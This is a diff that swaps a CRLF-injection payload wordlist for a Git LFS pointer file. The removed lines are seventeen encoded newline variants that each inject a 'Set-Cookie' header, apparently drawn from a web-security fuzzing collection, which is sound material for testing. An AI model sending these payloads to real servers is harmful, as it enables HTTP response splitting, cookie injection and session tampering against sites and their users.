@@ -1,17 +1,3 @@
-/%%0a0aSet-Cookie:crlf=injection
-/%0aSet-Cookie:crlf=injection
-/%0d%0aSet-Cookie:crlf=injection
-/%0dSet-Cookie:crlf=injection
-/%23%0aSet-Cookie:crlf=injection
-/%23%0d%0aSet-Cookie:crlf=injection
-/%23%0dSet-Cookie:crlf=injection
-/%25%30%61Set-Cookie:crlf=injection
-/%25%30aSet-Cookie:crlf=injection
-/%250aSet-Cookie:crlf=injection
-/%25250aSet-Cookie:crlf=injection
-/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection
-/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection
-/%2F..%0d%0aSet-Cookie:crlf=injection
-/%3f%0d%0aSet-Cookie:crlf=injection
-/%3f%0dSet-Cookie:crlf=injection
-/%u000aSet-Cookie:crlf=injection
+version https://git-lfs.github.com/spec/v1
+oid sha256:f1a723351cd2a7d271884668d384d10f4f5f088ca9600468802f2fbbf3d6a02f
+size 588
